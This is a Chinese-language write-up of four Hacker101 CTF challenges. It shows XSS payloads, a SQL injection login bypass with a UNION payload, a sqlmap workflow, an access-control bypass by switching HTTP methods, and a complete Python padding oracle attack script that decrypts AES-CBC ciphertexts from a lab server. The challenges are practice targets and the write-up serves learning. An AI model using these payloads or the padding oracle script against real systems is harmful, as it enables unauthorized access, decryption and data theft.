> 原文链接: https://www.anquanke.com//post/id/180186 


# 玩转Hacker101 CTF（一）


                                阅读量   
                                **372452**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t012536c97c3969cb78.png)](https://p2.ssl.qhimg.com/t012536c97c3969cb78.png)



最近打算到hackone上混混，意外的发现了[hack101 CTF](https://ctf.hacker101.com/ctf)这个东东,读了一下说明，貌似是只要在这个CTF中取得一定的分数就会收到hackone平台的私人渗透测试邀请，于是花了点时间完成了4道题，总体感觉题目的质量不错，与实际漏洞结合很紧密，有些点不容易想到，所以本着为想上hackone挖洞的童鞋提供一些便利，投了这篇稿子，并且打算持续更新，下面详述做题过程：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01a819298f8ff43279.gif)



## 第一题A little something to get you started

这个很简单，打开题目链接：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016d4b62e4415896cf.jpg)

常规思路右键查看网页源代码：

[![](https://p5.ssl.qhimg.com/t01a29d1550d8657af8.jpg)](https://p5.ssl.qhimg.com/t01a29d1550d8657af8.jpg)

发现可疑的background.png,访问之，得到flag：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01a6856b01f2e9f7d1.jpg)



## 第二题Micro-CMS v1

这个也不是很难，一共有3个flag，主要考察XSS知识，打开题目链接：

[![](https://p2.ssl.qhimg.com/t01b16d358f9fdb28a4.jpg)](https://p2.ssl.qhimg.com/t01b16d358f9fdb28a4.jpg)

页面上存在3个链接，其中前两个为已经存在的内容页面，第三个链接可以创建新的页面：

[![](https://p5.ssl.qhimg.com/t014df997542d595b83.jpg)](https://p5.ssl.qhimg.com/t014df997542d595b83.jpg)

第一个页面

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0122cc00f532b3f5e4.jpg)

第二个页面

[![](https://p3.ssl.qhimg.com/t0160507af1490113b2.jpg)](https://p3.ssl.qhimg.com/t0160507af1490113b2.jpg)

第二个页面

首先来看第一个页面，上面有Edit this page链接，点击可以修改页面的标题与内容：

[![](https://p2.ssl.qhimg.com/t01c95f27fa2b4df3b1.jpg)](https://p2.ssl.qhimg.com/t01c95f27fa2b4df3b1.jpg)

很自然的想到xss，先试试Title，编辑Title为：&lt;scrIpT&gt;alert(/xss/)&lt;/sCRipt&gt;

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01ab016fc67a409053.jpg)

保存，页面是这样的：

[![](https://p4.ssl.qhimg.com/t01973a553a89b1e77e.jpg)](https://p4.ssl.qhimg.com/t01973a553a89b1e77e.jpg)

到这里可能以为Title这里做了&lt;script&gt;标签的转义，实际上如果我们细心，就会留意到最初的主页上也是有我们的Title的，我们点击Go Home转到主页，果然发现了弹框：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01a9160285f7f88902.jpg)

这样就拿到了这道题的第一个flag，回想一下，刚刚的编辑页面中这样就拿到了这道题的第一个flag，回想一下，刚刚的编辑页面中还有内容框也可能存在xss，我们试一下：

[![](https://p3.ssl.qhimg.com/t01c250f81113872c5c.jpg)](https://p3.ssl.qhimg.com/t01c250f81113872c5c.jpg)

保存后页面是这样的：

[![](https://p2.ssl.qhimg.com/t01fc8d21b646dd28d6.jpg)](https://p2.ssl.qhimg.com/t01fc8d21b646dd28d6.jpg)

很明显，script标签被过滤了，别轻易放弃，换个不需要script的试试：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t013357abf1b447eabb.jpg)

保存，成功弹框，并且在网页源代码中发现了flag：

[![](https://p5.ssl.qhimg.com/t01a3a9dbdc76065a91.jpg)](https://p5.ssl.qhimg.com/t01a3a9dbdc76065a91.jpg)

[![](https://p4.ssl.qhimg.com/dm/1024_321_/t01b56790e15ee44aa6.jpg)](https://p4.ssl.qhimg.com/dm/1024_321_/t01b56790e15ee44aa6.jpg)

这样就拿到了这道题的第二个flag，猜想第三个flag可能与创建页面有关，先建个页面试试，建完以后是这样的

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0118c21b72c0d07083.jpg)

注意到这里的url最后page的参数为10，而刚刚那两个页面的参数为1和2，那么中间的数值去哪了呢？用burpsuite抓包，用Intruder功能访问这些页面：

[![](https://p3.ssl.qhimg.com/t01a4ed3cc9aec20ee7.jpg)](https://p3.ssl.qhimg.com/t01a4ed3cc9aec20ee7.jpg)

[![](https://p5.ssl.qhimg.com/t01d503f5853f747cde.gif)](https://p5.ssl.qhimg.com/t01d503f5853f747cde.gif)

可以看到GET /efa8a59c80/page/6时，返回的状态码为403而不是404，说明这个页面存在，但是我们没有权限访问，仔细回想，每个页面除了展示页面外还有编辑页面，这里page/6的展示页面我们没有权限访问，那么它的编辑页面会不会可以直接访问呢？通过观察前面两个页面的编辑页面的url，我们可以猜测page/6的编辑页面为page/edit/6,访问它：

[![](https://p4.ssl.qhimg.com/t01d6365caf817337bb.jpg)](https://p4.ssl.qhimg.com/t01d6365caf817337bb.jpg)

就拿到了此题的第三个flag



## 第三题Micro-CMS v2

此题难度稍有提升，主要考察sql注入知识，打开主页如下：

[![](https://p5.ssl.qhimg.com/t01011f4a0413f4f46f.jpg)](https://p5.ssl.qhimg.com/t01011f4a0413f4f46f.jpg)

页面布局与上一题基本一样，不同的是所有的页面点击后都需要登陆：

[![](https://p2.ssl.qhimg.com/t015e0809dd029e81ae.jpg)](https://p2.ssl.qhimg.com/t015e0809dd029e81ae.jpg)

随便输入一个不常用的用户名及密码，点击Log In,页面反馈如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0159f4374fda05abbc.jpg)

提示为Unknown user，我们先记着这个反馈回来的字符串

然后输入用户名adminsb’ or ‘’=’,密码adminsb’ or ‘’=’,点击Log In,页面反馈如下：

[![](https://p3.ssl.qhimg.com/t0131d5a8f56bb07866.jpg)](https://p3.ssl.qhimg.com/t0131d5a8f56bb07866.jpg)

这次反馈为Invalid password,说明用户名adminsb’ or ‘’=’虽然不存在但是却被判断为合法的用户名，所以依据反馈的不同可以进行布尔注入，而且可以猜想后台sql语句可能是类似下面这样的：

```
......
$result = $db-&gt;query(select password from users where username='$username');
if($result['password'] == $password)
    login_success();
......
```

利用burpsuite抓下post登陆包，保存为1.txt,将username参数的值标注为*，放到sqlmap中注入：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01bc4f1a94169f1e3b.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0106d1e1ae445a5cbf.jpg)

最终拿到用户名及密码：

[![](https://p3.ssl.qhimg.com/t01162ff66a03ec3082.gif)](https://p3.ssl.qhimg.com/t01162ff66a03ec3082.gif)

回到登录页面登录，拿到flag：

[![](https://p2.ssl.qhimg.com/t01c3a68e68a4449802.gif)](https://p2.ssl.qhimg.com/t01c3a68e68a4449802.gif)

看了一下这道题的提示，这个flag居然是flag2，flag0和flag1都还没有拿到，其中flag0给了这样一条提示：

`Getting admin access might require a more perfect union`

``结合刚刚猜测的后台sql逻辑，很容易想到以

```
用户名:adminsb' union select '123456
用户名:123456
```

尝试登录,果然不出所料，成功登陆，页面跳转：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01d4676611cb6170ed.jpg)

flag就在Private Page里：

[![](https://p2.ssl.qhimg.com/t01da43dfa45e9bb724.jpg)](https://p2.ssl.qhimg.com/t01da43dfa45e9bb724.jpg)

这样就拿到了flag0，

那么flag1呢，看了一下提示：

```
What actions could you perform as a regular user on the last level, which you can't now?
    Just because request fails with one method doesn't mean it will fail with a different method
    Different requests often have different required authorization
```

貌似是要用不同的请求方法去请求原本访问不了的页面，刚刚的Private page的url为page/3,其编辑页面为page/edit/3，这两个页面都是需要登陆才能访问的，我们依照提示换一下请求方法为POST，成功获取了flag1：

[![](https://p3.ssl.qhimg.com/dm/1024_128_/t013ac7308a42764015.jpg)](https://p3.ssl.qhimg.com/dm/1024_128_/t013ac7308a42764015.jpg)



## 第四题Encrypted Pastebin

这个题就厉害了，与密码学结合很紧密，打开页面如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01de4b6ec6dc4e3565.gif)

依照描述这是一个加密保存用户文本的web应用，加密方法使用AES-128，我们来试一试，在Tiltle以及内容框中分别输入一段信息，点击post,网页发生跳转：

[![](https://p4.ssl.qhimg.com/t0164391c034c65e847.jpg)](https://p4.ssl.qhimg.com/t0164391c034c65e847.jpg)

可以看到，服务器仅仅通过url中的信息就还原出了我们刚刚输入的文本，所以这里我猜想有两种可能性：

```
我们输入的信息被加密保存在了url的post参数中，服务器接收后直接解密返回给浏览器。
我们输入的信息被保存在了服务器的数据库中，post参数只是加密后的索引值，服务器解密这个索引值后再到数据库中取出数据，返回给浏览器。
```

那么哪种才是正确的呢，如果你学过密码学我们应该清楚，如果加密前的明文信息量越大，那么密文的信息量肯定也越大，否则必然会导致信息丢失，那么如果是上面第一种可能，我们尝试增大文本量，那么post参数的值肯定也越长，我们来验证一下，抓下编辑文本的数据包：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t011892d788a610e97f.jpg)

不断增大body的内容：

[![](https://p5.ssl.qhimg.com/dm/1024_249_/t01794d1cd16906f4cf.jpg)](https://p5.ssl.qhimg.com/dm/1024_249_/t01794d1cd16906f4cf.jpg)

可以发现返回的url中的post参数长度并没有变化，这就推翻了第一种可能性，所以post参数的值很可能是加密后的数据库索引，看来这道题需要我们想办法破解密文。

在抓包点击Follow redirection跟踪跳转：

[![](https://p4.ssl.qhimg.com/dm/1024_238_/t011d55f105f2611dd8.jpg)](https://p4.ssl.qhimg.com/dm/1024_238_/t011d55f105f2611dd8.jpg)

尝试随意删改url中的post参数,居然爆出了第一个flag！

[![](https://p0.ssl.qhimg.com/dm/1024_265_/t016650c8a9fc8f2ddc.jpg)](https://p0.ssl.qhimg.com/dm/1024_265_/t016650c8a9fc8f2ddc.jpg)

同时，爆出了一些后台处理逻辑：

```
Traceback (most recent call last):
  File "./main.py", line 69, in index
    post = json.loads(decryptLink(postCt).decode('utf8'))
  File "./common.py", line 46, in decryptLink
    data = b64d(data)
  File "./common.py", line 11, in &lt;lambda&gt;
    b64d = lambda x: base64.decodestring(x.replace('~', '=').replace('!', '/').replace('-', '+'))
  File "/usr/local/lib/python2.7/base64.py", line 328, in decodestring
    return binascii.a2b_base64(s)
Error: Incorrect padding
```

从以上报错我们可以得出下列信息：

```
后台脚本为python(这个知道了貌似没啥用)
url的post参数为一串处理过的base64值，处理逻辑为：
x.replace('~', '=').replace('!', '/').replace('-', '+')
```

另外，我们从主页中可以得知加密算法为AES-128，那么其密文数据块大小应该是16字节，那么如果我们将post参数改为小于16个字节会怎么样呢？我们来试一下：

[![](https://p3.ssl.qhimg.com/dm/1024_292_/t0149ef98add1c5c1fd.jpg)](https://p3.ssl.qhimg.com/dm/1024_292_/t0149ef98add1c5c1fd.jpg)

看，又有新的报错（注意为了不发生base64解码错误，这里post的值必须在结尾加上两个~~，也就是替换后的==,），新的报错信息如下：

```
Traceback (most recent call last):
  File "./main.py", line 69, in index
    post = json.loads(decryptLink(postCt).decode('utf8'))
  File "./common.py", line 48, in decryptLink
    cipher = AES.new(staticKey, AES.MODE_CBC, iv)
  File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/AES.py", line 95, in new
    return AESCipher(key, *args, **kwargs)
  File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/AES.py", line 59, in __init__
    blockalgo.BlockAlgo.__init__(self, _AES, key, *args, **kwargs)
  File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/blockalgo.py", line 141, in __init__
    self._cipher = factory.new(key, *args, **kwargs)
ValueError: IV must be 16 bytes long
```

从上述报错中我们可以得到下列信息：

```
加密用的AES算法模式为CBC，密钥为staticKey，应该配置在服务端
CBC模式使用的iv就在post参数中，iv的长度为16字节，而且应该就是post参数base64解码后的前16个字节
```

我们尝试构造一个长度合法的密文：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01163483abe5a452fa.gif)

放到post参数中发送：

[![](https://p1.ssl.qhimg.com/t01e49e5139635e21c2.jpg)](https://p1.ssl.qhimg.com/t01e49e5139635e21c2.jpg)

又产生了新的报错：

```
Traceback (most recent call last):
  File "./main.py", line 69, in index
    post = json.loads(decryptLink(postCt).decode('utf8'))
  File "./common.py", line 49, in decryptLink
    return unpad(cipher.decrypt(data))
  File "./common.py", line 22, in unpad
    raise PaddingException()
PaddingException
```

注意这里触发了AES解密函数的PaddingException异常，到这里，已经满足了Padding Oracle Attack的必要条件：

```
攻击者能够获得密文（ciphertext），以及密文对应的IV（初始化向量）
攻击者能够触发密文的解密过程，且能够知道密文的解密结果
```

关于Padding Oracle Attack，是一个一言难尽的话题，这两篇文章讲的比较清楚：

[传送门1](https://www.cnblogs.com/LittleHann/p/3391393.html)

[传送门2](https://www.cnblogs.com/zlhff/p/5519175.html)

简而言之，就是不断调整iv使其能够返回正确的解密结果从而推断出明文，废话不多说，展示一下花了一天时间整出来的渣渣代码：

```
#coding=utf-8
import base64,requests,re,threading,json

def my_xor2(str1,str2):
    new_str = ""
    for i in range(len(str1)):
        new_str = new_str + chr(ord(str1[i])^ord(str2[i]))
    return new_str

def is_padding_right(url):
    r = requests.get(url)
    if key_str not in r.text:
        print r.text
        return True
    else:
        return False

b64d = lambda x: base64.decodestring(x.replace('~', '=').replace('!', '/').replace('-', '+'))
b64e = lambda x: base64.encodestring(x).replace('=','~').replace('/','!').replace('+','-')

def attack(block_index):
    iv = cipher_blocks[block_index]
    cipher = cipher_blocks[block_index+1]
    iv_chs = [iv[i:i+1] for i in range(0,len(iv),1)] #拆分iv为数组便于处理
    iv_index = 15
    m_value = ['a']*16 #用于存储中间值

    while(iv_index &gt; -1):
        if iv_index != 15:
            for temp in range(iv_index+1,16):
                iv_chs[temp] = chr(ord(m_value[temp]) ^ (16 - iv_index)) #更新iv

        for num in range(256):
            iv_chs[iv_index] = chr(num)
            data = ""
            data = data.join(iv_chs)
            data = data + cipher

            new_url = ""
            new_url = url + b64e(data)    
            #print new_url
            if is_padding_right(new_url):
                m_value[iv_index] = chr(num^(16-iv_index))
                break

        iv_index = iv_index - 1
        print "block_index:",block_index,"[iv_index:",iv_index*"#","]"

    m_value_str = ""
    m_value_str = m_value_str.join(m_value)
    plain[block_index] = my_xor2(m_value_str,iv)
    print "Get plain block:#",block_index,":",plain[block_index]

url = "http://35.190.155.168/ebe58e9d6e/?post="

example = "w4N2JrPqWa7ZO8IVMiJMx3Zv6QqPJ1C1KVjIyLDkP1OFTbLI16Xc8KGetNaEx6L!02QDVwicF8Eoy6387pdyjTbe6c6q3hZRXbArGQIpmmT9KQW0!Yj5KGLDJA96iscGvKZ2G3SvGVhASFSpyiLrVYHhXL0UKzbr1BtCAOHdlxTKgcM5taNouOyclY8feTbPguDnqHqhibyVnw55RChVqA~~"

key_str = "PaddingException"

str = b64d(example)
cipher_blocks = [str[i:i+16] for i in range(0,len(str),16)]

if(len(cipher_blocks) &lt; 2):
    print "ERROR,you should at least have 2 blocks!"
    exit()

threads = []
for i in range(9): #密文一共有9块,所以开9个线程
    t = threading.Thread(target=attack,args=(i,))
    threads.append(t)

plain = ["a"]*9 #明文一共9块

for t in threads:
    t.setDaemon(True)
    t.start()

for t in threads:
    t.join()

plain_text = ""
plain_text = plain_text.join(plain)

print "result plain:",plain_text
```

经测试在美帝的vps上跑，大约10分钟就可以出结果。<br>
最终结果：

```
result plain: `{`"flag": "^FLAG^ddee16a603148f1d230889fc3e85e53e3b3792095b9d5f3987046f22a63e9cdf$FLAG$", "id": "3", "key": "0vGaWMGLxVgY-IAm5ZWhfQ~~"`}`
```

这样第二个flag就拿到了。这道题还有第三、第四个flag，我没有继续做下去，因为至此已经获取了足够的分数可以参与私人渗透请求了，不过我可以给想继续做下去的童鞋两点思路：

```
上面解出的明文中id为"3"，可以通过修改前一块密文的对应字节，使之变为"1",因为我记得只向数据库中插入了两条记录，那么id为"1"到底是什么呢，我猜很可能就是flag。
```

```
在跑上面的脚本过程中，我发现一条有意思的报错：
Traceback (most recent call last):
  File "./main.py", line 71, in index
    if cur.execute('SELECT title, body FROM posts WHERE id=%s' % post['id']) == 0:
TypeError: 'int' object has no attribute '__getitem__'
```

注意这里的sql语句，想到了什么，对！就是注入，如果我们让解密出来的明文中的id值为”-1 union select database(),user()”那么sql语句就会变为：

```
SELECT title, body FROM posts WHERE id=-1 union select database(),user()
```

数据库信息就会回显在页面中，所以这里还可以进行sql注入，只不过payload需要用padding oracle attack的办法进行加密，不过这个想想都掉头发，我头发少，就留给你们了（笑）！

那么就让我们开始愉快地挖洞吧！
